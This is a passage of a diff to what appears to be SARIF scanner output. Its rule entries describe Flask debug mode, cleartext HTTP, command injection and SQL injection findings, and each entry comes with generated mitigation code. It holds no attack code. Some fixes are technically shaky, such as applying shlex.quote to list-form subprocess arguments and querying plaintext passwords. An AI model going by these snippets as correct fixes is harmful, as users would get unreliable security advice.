@@ -34,6 +34,28 @@
               }
             },
             {
+              "id": "e35cbb27-fe53-3d6d-aaf7-d174c5d92756",
+              "name": "Flask App Debug Mode Vulnerability",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe Flask App Debug Mode Vulnerability in Python programming language is a security flaw that arises when the debug mode in a Flask application is left enabled in a production environment. When the debug mode is enabled, it provides detailed error pages with stack traces if an error occurs in the application. This can expose sensitive information such as the application's source code, configuration details, and other system information, which can be exploited by attackers to gain unauthorized access or conduct other malicious activities.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should ensure that the debug mode is disabled in a production environment. This can be done by setting the debug parameter to False when calling the run() method of the Flask application object. \n\n## Source Code Fix Recommendation\n\nHere is the fixed version of the code:\n\n```python\napp.run(debug=False, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n```\n\n## Library Dependencies\n\nThe code example requires the following Python library to execute properly:\n\n- Flask\n\n## References\n\n- [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-489",
+                    "url": "https://cwe.mitre.org/data/definitions/489.html"
+                  }
+                ],
+                "severity": "HIGH",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-489"
+                ]
+              }
+            },
+            {
               "id": "4869493e-78c1-35af-88ab-cf2b3d40c685",
               "name": "SQL Injection Vulnerability via String-Based Query Construction",
               "helpUri": "https://www.glog.ai/",
@@ -56,12 +78,78 @@
               }
             },
             {
+              "id": "8e4d21d7-f881-305d-b031-ef5f82af0dca",
+              "name": "Unencrypted HTTP Request Vulnerability Detected",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe \"Unencrypted HTTP Request Vulnerability Detected\" vulnerability in Python refers to the situation where sensitive data is sent over an unencrypted HTTP connection. This can expose the data to potential interception by attackers, who can then use the data for malicious purposes. In the provided code, an API key is being sent over an unencrypted HTTP connection, which is a security risk.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use HTTPS instead of HTTP for sending sensitive data. HTTPS encrypts the data that is sent between the client and the server, making it much more difficult for attackers to intercept and understand the data.\n\n## Source Code Fix Recommendation\n\nHere is the fixed code:\n\n```python\nimport requests\n\nr = requests.post('https://127.0.1.1:5000/api/post', json={'text':message}, headers={'X-APIKEY': api_key})\n```\n\n## Library Dependencies\n\nThe code example requires the following library to execute properly:\n\n- requests\n\n## OWASP and CWE Links\n\n- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-319",
+                    "url": "https://cwe.mitre.org/data/definitions/319.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-319"
+                ]
+              }
+            },
+            {
               "id": "a863a129-f894-3b6d-a8fe-740a9856d333",
               "name": "Unencrypted HTTP Request Vulnerability Detected",
               "helpUri": "https://www.glog.ai/",
               "help": {
                 "text": "",
                 "markdown": "## Description\n\nThe \"Unencrypted HTTP Request Vulnerability Detected\" vulnerability in Python refers to the situation where sensitive data is sent over an unencrypted HTTP connection. This can expose the data to potential interception by attackers, who can then use the data for malicious purposes. In the provided code, the username is being sent in a GET request over HTTP, which is unencrypted.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use HTTPS instead of HTTP for sending sensitive data. HTTPS encrypts the data that is sent between the client and the server, making it much more difficult for an attacker to intercept and understand the data.\n\n## Source Code Fix Recommendation\n\nHere is a fixed version of the code:\n\n```python\nimport requests\n\nr = requests.get('https://127.0.1.1:5000/api/post/{}'.format(username))\n```\n\n## Library Dependencies\n\nThe code example requires the following Python library:\n\n- requests\n\n## References\n\n- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-319",
+                    "url": "https://cwe.mitre.org/data/definitions/319.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-319"
+                ]
+              }
+            },
+            {
+              "id": "35b189b2-0edd-308d-9f6b-fd5aab95659b",
+              "name": "\"Potential Command Injection Vulnerability Detected in 'run' Subprocess Function\"",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe `subprocess.run` function in Python is used to run new applications or commands while capturing their output. A potential command injection vulnerability is detected when user-supplied input is directly used in the `subprocess.run` function without proper sanitization or validation. This could allow an attacker to execute arbitrary commands on the system with the privileges of the user running the Python script.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to avoid using user-supplied input directly in the `subprocess.run` function. If it is necessary to use user input, it should be properly sanitized and validated to ensure it does not contain any malicious commands. \n\n## Source Code Fix Recommendation\n\nIn the provided code, the `username` and `password` variables are directly used in the `subprocess.run` function. If these variables contain user-supplied input, they should be properly sanitized and validated. Here is a fixed version of the code:\n\n```python\nimport shlex\nimport subprocess\n\n# Assume username and password are user-supplied input\nusername = shlex.quote(username)\npassword = shlex.quote(password)\n\nresult = subprocess.run([program, username, password], stdout=subprocess.DEVNULL)\n```\n\nIn this fixed version, the `shlex.quote` function is used to properly escape the `username` and `password` variables. This ensures that they cannot be used to inject arbitrary commands.\n\n## Library Dependencies\n\nThe code example requires the following Python standard library dependencies:\n\n- `subprocess`\n- `shlex` (for the fixed version)\n\n## References\n\n- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)\n- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-78",
+                    "url": "https://cwe.mitre.org/data/definitions/78.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-78"
+                ]
+              }
+            },
+            {
+              "id": "f656cfe9-996d-3de0-9f20-fa4d0a6bd81f",
+              "name": "Unencrypted HTTP Request Vulnerability Detected",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe vulnerability \"Unencrypted HTTP Request Vulnerability Detected\" refers to the situation where sensitive data is sent over an unencrypted HTTP connection. In the provided Python code, the username and password are sent in a POST request over HTTP, which is not secure. This data could be intercepted by an attacker who is listening on the network, leading to a potential data breach.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always use HTTPS when sending sensitive data. HTTPS encrypts the data between the client and the server, making it much more difficult for an attacker to intercept and read the data.\n\n## Source Code Fix Recommendation\n\nHere is how you can fix the provided code:\n\n```python\nimport requests\n\nr = requests.post('https://127.0.1.1:5000/api/key', json={'username':username, 'password':password})\n```\n\nIn this fixed code, we simply replaced 'http' with 'https' in the URL.\n\n## Library Dependencies\n\nThe provided code requires the following Python library to be installed:\n\n- requests\n\nYou can install it using pip:\n\n```bash\npip install requests\n```\n\n## References\n\n- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)"
               },
               "properties": {
                 "cwe": [
@@ -100,46 +188,24 @@
               }
             },
             {
-              "id": "35b189b2-0edd-308d-9f6b-fd5aab95659b",
-              "name": "\"Potential Command Injection Vulnerability Detected in 'run' Subprocess Function\"",
+              "id": "f4cd44b8-df7f-358c-ae49-115800bd61a3",
+              "name": "SQL Injection Vulnerability via String-Based Query Construction",
               "helpUri": "https://www.glog.ai/",
               "help": {
                 "text": "",
-                "markdown": "## Description\n\nThe `subprocess.run` function in Python is used to run new applications or commands while capturing their output. A potential command injection vulnerability is detected when user-supplied input is directly used in the `subprocess.run` function without proper sanitization or validation. This could allow an attacker to execute arbitrary commands on the system with the privileges of the user running the Python script.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to avoid using user-supplied input directly in the `subprocess.run` function. If it is necessary to use user input, it should be properly sanitized and validated to ensure it does not contain any malicious commands. \n\n## Source Code Fix Recommendation\n\nIn the provided code, the `username` and `password` variables are directly used in the `subprocess.run` function. If these variables contain user-supplied input, they should be properly sanitized and validated. Here is a fixed version of the code:\n\n```python\nimport shlex\nimport subprocess\n\n# Assume username and password are user-supplied input\nusername = shlex.quote(username)\npassword = shlex.quote(password)\n\nresult = subprocess.run([program, username, password], stdout=subprocess.DEVNULL)\n```\n\nIn this fixed version, the `shlex.quote` function is used to properly escape the `username` and `password` variables. This ensures that they cannot be used to inject arbitrary commands.\n\n## Library Dependencies\n\nThe code example requires the following Python standard library dependencies:\n\n- `subprocess`\n- `shlex` (for the fixed version)\n\n## References\n\n- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)\n- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)"
+                "markdown": "## Description\n\nSQL Injection Vulnerability via String-Based Query Construction is a common security vulnerability in Python programming language. It occurs when an application uses user input to construct SQL queries without properly sanitizing it. This allows an attacker to manipulate the SQL query to perform unauthorized actions, such as viewing, modifying, or deleting data.\n\nIn the provided code snippet, the application is using string formatting to construct an SQL query. This makes it vulnerable to SQL injection attacks if the user input (`u` and `p`) is not properly sanitized.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should avoid using string formatting to construct SQL queries. Instead, use parameterized queries or prepared statements, which can ensure that user input is properly sanitized and cannot be used to manipulate the SQL query.\n\n## Source Code Fix Recommendation\n\nHere is a fixed version of the provided code snippet using parameterized queries:\n\n```python\nc.execute(\"INSERT INTO users (user, password, failures) VALUES (?, ?, ?)\", (u, p, 0))\n```\n\n## Library Dependencies\n\nThe provided code snippet requires the `sqlite3` library to execute properly.\n\n## OWASP Resources\n\n- [OWASP Python Security - SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [OWASP Top 10 2017 Category A1 - Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)\n\n## Common Weakness Enumeration (CWE)\n\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
               },
               "properties": {
                 "cwe": [
                   {
-                    "id": "CWE-78",
-                    "url": "https://cwe.mitre.org/data/definitions/78.html"
+                    "id": "CWE-89",
+                    "url": "https://cwe.mitre.org/data/definitions/89.html"
                   }
                 ],
                 "severity": "MEDIUM",
                 "kind": "FAIL",
                 "tags": [
-                  "CWE-78"
-                ]
-              }
-            },
-            {
-              "id": "8e4d21d7-f881-305d-b031-ef5f82af0dca",
-              "name": "Unencrypted HTTP Request Vulnerability Detected",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe \"Unencrypted HTTP Request Vulnerability Detected\" vulnerability in Python refers to the situation where sensitive data is sent over an unencrypted HTTP connection. This can expose the data to potential interception by attackers, who can then use the data for malicious purposes. In the provided code, an API key is being sent over an unencrypted HTTP connection, which is a security risk.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use HTTPS instead of HTTP for sending sensitive data. HTTPS encrypts the data that is sent between the client and the server, making it much more difficult for attackers to intercept and understand the data.\n\n## Source Code Fix Recommendation\n\nHere is the fixed code:\n\n```python\nimport requests\n\nr = requests.post('https://127.0.1.1:5000/api/post', json={'text':message}, headers={'X-APIKEY': api_key})\n```\n\n## Library Dependencies\n\nThe code example requires the following library to execute properly:\n\n- requests\n\n## OWASP and CWE Links\n\n- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-319",
-                    "url": "https://cwe.mitre.org/data/definitions/319.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-319"
+                  "CWE-89"
                 ]
               }
             },
@@ -166,73 +232,7 @@
               }
             },
             {
-              "id": "f656cfe9-996d-3de0-9f20-fa4d0a6bd81f",
-              "name": "Unencrypted HTTP Request Vulnerability Detected",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe vulnerability \"Unencrypted HTTP Request Vulnerability Detected\" refers to the situation where sensitive data is sent over an unencrypted HTTP connection. In the provided Python code, the username and password are sent in a POST request over HTTP, which is not secure. This data could be intercepted by an attacker who is listening on the network, leading to a potential data breach.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always use HTTPS when sending sensitive data. HTTPS encrypts the data between the client and the server, making it much more difficult for an attacker to intercept and read the data.\n\n## Source Code Fix Recommendation\n\nHere is how you can fix the provided code:\n\n```python\nimport requests\n\nr = requests.post('https://127.0.1.1:5000/api/key', json={'username':username, 'password':password})\n```\n\nIn this fixed code, we simply replaced 'http' with 'https' in the URL.\n\n## Library Dependencies\n\nThe provided code requires the following Python library to be installed:\n\n- requests\n\nYou can install it using pip:\n\n```bash\npip install requests\n```\n\n## References\n\n- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-319",
-                    "url": "https://cwe.mitre.org/data/definitions/319.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-319"
-                ]
-              }
-            },
-            {
-              "id": "e35cbb27-fe53-3d6d-aaf7-d174c5d92756",
-              "name": "Flask App Debug Mode Vulnerability",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe Flask App Debug Mode Vulnerability in Python programming language is a security flaw that arises when the debug mode in a Flask application is left enabled in a production environment. When the debug mode is enabled, it provides detailed error pages with stack traces if an error occurs in the application. This can expose sensitive information such as the application's source code, configuration details, and other system information, which can be exploited by attackers to gain unauthorized access or conduct other malicious activities.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should ensure that the debug mode is disabled in a production environment. This can be done by setting the debug parameter to False when calling the run() method of the Flask application object. \n\n## Source Code Fix Recommendation\n\nHere is the fixed version of the code:\n\n```python\napp.run(debug=False, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n```\n\n## Library Dependencies\n\nThe code example requires the following Python library to execute properly:\n\n- Flask\n\n## References\n\n- [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-489",
-                    "url": "https://cwe.mitre.org/data/definitions/489.html"
-                  }
-                ],
-                "severity": "HIGH",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-489"
-                ]
-              }
-            },
-            {
-              "id": "f4cd44b8-df7f-358c-ae49-115800bd61a3",
-              "name": "SQL Injection Vulnerability via String-Based Query Construction",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nSQL Injection Vulnerability via String-Based Query Construction is a common security vulnerability in Python programming language. It occurs when an application uses user input to construct SQL queries without properly sanitizing it. This allows an attacker to manipulate the SQL query to perform unauthorized actions, such as viewing, modifying, or deleting data.\n\nIn the provided code snippet, the application is using string formatting to construct an SQL query. This makes it vulnerable to SQL injection attacks if the user input (`u` and `p`) is not properly sanitized.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should avoid using string formatting to construct SQL queries. Instead, use parameterized queries or prepared statements, which can ensure that user input is properly sanitized and cannot be used to manipulate the SQL query.\n\n## Source Code Fix Recommendation\n\nHere is a fixed version of the provided code snippet using parameterized queries:\n\n```python\nc.execute(\"INSERT INTO users (user, password, failures) VALUES (?, ?, ?)\", (u, p, 0))\n```\n\n## Library Dependencies\n\nThe provided code snippet requires the `sqlite3` library to execute properly.\n\n## OWASP Resources\n\n- [OWASP Python Security - SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [OWASP Top 10 2017 Category A1 - Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)\n\n## Common Weakness Enumeration (CWE)\n\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-89",
-                    "url": "https://cwe.mitre.org/data/definitions/89.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-89"
-                ]
-              }
-            },
-            {
-              "id": "8fdc682e-a47e-338e-a4d6-13373398e33f",
+              "id": "563d99e8-bbca-3a4d-b821-042b6999c80e",
               "name": "Potential Unsafe Use of Temporary File/Directory",
               "helpUri": "https://www.glog.ai/",
               "help": {
@@ -298,24 +298,46 @@
               }
             },
             {
-              "id": "4f64a990-7b21-3786-a407-06b9f07b7c18",
-              "name": "Flask App Debug Mode Vulnerability",
+              "id": "d5d8f528-c81c-3b5d-b331-e568a52293b8",
+              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, and SQLAlchemy ORM for Safe SQL Query Execution\"",
               "helpUri": "https://www.glog.ai/",
               "help": {
                 "text": "",
-                "markdown": "## Description\n\nThe Flask App Debug Mode Vulnerability is a security flaw that occurs when a Flask application is run in debug mode in a production environment. When the debug mode is enabled, it provides a lot of sensitive information about the application, which can be exploited by attackers to gain unauthorized access or perform other malicious activities. This is because the debug mode is designed for use during development, where such information is useful for troubleshooting, and not for production, where it can pose a security risk.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should ensure that the debug mode is turned off in the production environment. This can be done by setting the debug parameter to False when calling the run method of the Flask application. \n\n## Source Code Fix Recommendation\n\nHere is how you can fix the vulnerability in the provided code:\n\n```python\napp.run(debug=False, host='127.0.1.1', port=5000, extra_files='csp.txt')\n```\n\n## Library Dependencies\n\nThe code example requires the following library to execute properly:\n\n- Flask\n\n## References\n\n- [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)"
+                "markdown": "## Description\n\nThe provided code is vulnerable to SQL Injection, a common security vulnerability that allows an attacker to manipulate SQL queries. This can lead to unauthorized data access, data corruption, or even data loss. The vulnerability arises from the use of string formatting to create SQL queries, which allows an attacker to inject malicious SQL code by providing specially crafted input.\n\nIn Python, SQL Injection can be prevented by using Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, and SQLAlchemy ORM for safe SQL query execution. These methods ensure that user input is properly escaped or parameterized, preventing it from being interpreted as part of the SQL query.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should avoid using string formatting to create SQL queries. Instead, use parameterized queries or prepared statements. This ensures that user input is always treated as data, not as part of the SQL command.\n\n## Source Code Fix Recommendation\n\nHere is a fixed version of the code using parameterized queries:\n\n```python\nc.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES (?, ?, ?, ?, ?)\", (u, p, 0, 0, ''))\n```\n\n## Library Dependencies\n\nThe code example requires the `sqlite3` library, which is included in the standard Python library.\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
               },
               "properties": {
                 "cwe": [
                   {
-                    "id": "CWE-489",
-                    "url": "https://cwe.mitre.org/data/definitions/489.html"
+                    "id": "CWE-89",
+                    "url": "https://cwe.mitre.org/data/definitions/89.html"
                   }
                 ],
-                "severity": "HIGH",
+                "severity": "MEDIUM",
                 "kind": "FAIL",
                 "tags": [
-                  "CWE-489"
+                  "CWE-89"
+                ]
+              }
+            },
+            {
+              "id": "fe7f9f06-1528-3e67-ada4-c6ac1ffac636",
+              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, and SQLAlchemy ORM for Safe SQL Query Execution\"",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nSQL Injection is a common security vulnerability that occurs when an attacker can insert malicious SQL statements into an SQL query. In Python, this can occur when using the `execute` method of a cursor object to execute SQL queries that include user-supplied input. The specific vulnerability sink in the provided code is the use of the `format` method to include `username` and `password` in the SQL query. This allows an attacker to manipulate the query, potentially gaining unauthorized access to data or performing other malicious actions.\n\n## Mitigation Advice\n\nTo prevent SQL Injection, it is recommended to use parameterized queries or prepared statements, which can ensure that user-supplied input is always treated as literal data, not part of the SQL command. \n\nIn addition, using an Object-Relational Mapping (ORM) library like SQLAlchemy can provide a higher level of abstraction for database operations, which can help to prevent SQL Injection. SQLAlchemy's SQL Expression Language and Schema Definition Language provide a Pythonic way to build SQL queries and define database schemas, respectively.\n\n## Source Code Fix Recommendation\n\nHere is a recommended fix for the provided code using SQLAlchemy and its ORM:\n\n```python\nfrom sqlalchemy import create_engine, text\n\nengine = create_engine('sqlite:///example.db')\nconnection = engine.connect()\n\nstmt = text(\"SELECT * FROM users WHERE username = :username and password = :password\")\nresult = connection.execute(stmt, username=username, password=password).fetchone()\n\nuser = result[0] if result else None\n```\n\n## Library Dependencies\n\n- SQLAlchemy\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-89",
+                    "url": "https://cwe.mitre.org/data/definitions/89.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-89"
                 ]
               }
             },
@@ -364,6 +386,28 @@
               }
             },
             {
+              "id": "cad7b472-33c5-3120-b2c7-5ade94ef63f3",
+              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, and SQLAlchemy ORM\"",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe provided code is vulnerable to SQL Injection, a common security vulnerability that occurs when an attacker can insert malicious SQL statements into an SQL query. The vulnerability exists because the code directly uses string formatting to include user-supplied input in an SQL query. An attacker could exploit this by providing specially crafted input that modifies the SQL query to perform actions not intended by the developer.\n\n## Mitigation Advice\n\nTo prevent SQL Injection vulnerabilities, it's recommended to use parameterized queries or prepared statements, which can ensure that user-supplied input is always treated as literal data and not part of the SQL command. \n\nIn Python, you can use the `sqlite3` module's support for parameterized queries to prevent SQL Injection. Instead of using string formatting to include user-supplied input in the SQL query, you should use `?` as a placeholder and provide the input as a separate argument.\n\n## Source Code Fix\n\nHere's how you can modify the provided code to use a parameterized query:\n\n```python\nc.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES (?, ?, ?, ?, ?)\", \n          (username, password, 0, 0, ''))\n```\n\n## Library Dependencies\n\nThe provided code requires the `sqlite3` module, which is included in the Python Standard Library, so no additional library dependencies are needed.\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-89",
+                    "url": "https://cwe.mitre.org/data/definitions/89.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-89"
+                ]
+              }
+            },
+            {
               "id": "46755491-b0f8-316f-a803-209b104c5c01",
               "name": "Flask App Debug Mode Vulnerability",
               "helpUri": "https://www.glog.ai/",
@@ -386,34 +430,12 @@
               }
             },
             {
-              "id": "fe7f9f06-1528-3e67-ada4-c6ac1ffac636",
-              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, and SQLAlchemy ORM for Safe SQL Query Execution\"",
+              "id": "4045dc1a-ec12-368e-a484-39cbaea10c2f",
+              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, or SQLAlchemy ORM\"",
               "helpUri": "https://www.glog.ai/",
               "help": {
                 "text": "",
-                "markdown": "## Description\n\nSQL Injection is a common security vulnerability that occurs when an attacker can insert malicious SQL statements into an SQL query. In Python, this can occur when using the `execute` method of a cursor object to execute SQL queries that include user-supplied input. The specific vulnerability sink in the provided code is the use of the `format` method to include `username` and `password` in the SQL query. This allows an attacker to manipulate the query, potentially gaining unauthorized access to data or performing other malicious actions.\n\n## Mitigation Advice\n\nTo prevent SQL Injection, it is recommended to use parameterized queries or prepared statements, which can ensure that user-supplied input is always treated as literal data, not part of the SQL command. \n\nIn addition, using an Object-Relational Mapping (ORM) library like SQLAlchemy can provide a higher level of abstraction for database operations, which can help to prevent SQL Injection. SQLAlchemy's SQL Expression Language and Schema Definition Language provide a Pythonic way to build SQL queries and define database schemas, respectively.\n\n## Source Code Fix Recommendation\n\nHere is a recommended fix for the provided code using SQLAlchemy and its ORM:\n\n```python\nfrom sqlalchemy import create_engine, text\n\nengine = create_engine('sqlite:///example.db')\nconnection = engine.connect()\n\nstmt = text(\"SELECT * FROM users WHERE username = :username and password = :password\")\nresult = connection.execute(stmt, username=username, password=password).fetchone()\n\nuser = result[0] if result else None\n```\n\n## Library Dependencies\n\n- SQLAlchemy\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-89",
-                    "url": "https://cwe.mitre.org/data/definitions/89.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-89"
-                ]
-              }
-            },
-            {
-              "id": "cad7b472-33c5-3120-b2c7-5ade94ef63f3",
-              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, and SQLAlchemy ORM\"",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe provided code is vulnerable to SQL Injection, a common security vulnerability that occurs when an attacker can insert malicious SQL statements into an SQL query. The vulnerability exists because the code directly uses string formatting to include user-supplied input in an SQL query. An attacker could exploit this by providing specially crafted input that modifies the SQL query to perform actions not intended by the developer.\n\n## Mitigation Advice\n\nTo prevent SQL Injection vulnerabilities, it's recommended to use parameterized queries or prepared statements, which can ensure that user-supplied input is always treated as literal data and not part of the SQL command. \n\nIn Python, you can use the `sqlite3` module's support for parameterized queries to prevent SQL Injection. Instead of using string formatting to include user-supplied input in the SQL query, you should use `?` as a placeholder and provide the input as a separate argument.\n\n## Source Code Fix\n\nHere's how you can modify the provided code to use a parameterized query:\n\n```python\nc.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES (?, ?, ?, ?, ?)\", \n          (username, password, 0, 0, ''))\n```\n\n## Library Dependencies\n\nThe provided code requires the `sqlite3` module, which is included in the Python Standard Library, so no additional library dependencies are needed.\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
+                "markdown": "## Description\n\nThe provided code is vulnerable to SQL Injection, a code injection technique that attackers can use to exploit vulnerabilities in a web application's database layer. This happens when the application uses user input to construct SQL queries without properly sanitizing or escaping it. In Python, this is often seen when developers use string formatting methods to create SQL queries, as shown in the provided code.\n\nIn the provided code, an attacker can provide malicious input for `username` and `password` variables that can alter the SQL query to perform unintended actions, such as deleting tables, modifying data, or even revealing sensitive information.\n\n## Mitigation Advice\n\nTo prevent SQL Injection attacks, it's recommended to use parameterized queries or prepared statements, which can ensure that user input is always treated as literal data and not part of the SQL command. \n\nPython's `sqlite3` module, which is commonly used for interacting with SQLite databases, supports this feature. Other SQL libraries in Python, such as SQLAlchemy, also support this feature, along with additional tools like TextualSQL, SQL Expression Language, and Schema Definition Language.\n\n## Source Code Fix\n\nHere's how you can fix the provided code using parameterized queries with `sqlite3`:\n\n```python\nc.execute(\"UPDATE users SET password = ? WHERE username = ?\", (password, username))\n```\n\nIn this code, `?` is a placeholder that `sqlite3` will replace with the values in the tuple `(password, username)`. `sqlite3` will automatically sanitize these values to prevent SQL Injection.\n\n## Library Dependencies\n\nThe provided code requires the `sqlite3` module, 